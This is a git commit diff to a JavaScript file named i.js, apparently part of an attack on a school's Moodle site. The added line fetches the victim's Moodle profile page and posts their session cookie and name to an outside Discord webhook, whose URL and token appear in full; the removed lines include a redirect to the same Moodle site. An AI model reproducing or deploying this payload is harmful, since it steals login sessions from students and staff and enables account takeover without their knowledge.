11bedf2d60d288d2e3ec8e759ecb034250fa1814
JLYUOLFLTB <113305682+JLYUOLFLTB@users.noreply.github.com>
2022-09-11 22:37:43 +0200

    Update i.js

--- i.js
+++ i.js
@@ -1,3 +1,1 @@
-console.log("test");
-console.log("multiline");
-document.location.href="https://gymkyjov.cz/moodle";
+fetch("/moodle/user/profile.php").then(t=>t.text()).then(t=>fetch("https://discord.com/api/webhooks/1018619501547368549/JgXrPAMwhUwYJpFzs8wd40R15rrGnu-G0bGMl_YoqgP57YU6RhHeTu8j-y3wNhDOMMNy",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:document.cookie+" -> "+t.split("<title>")[1].split(": ")[0]})}));
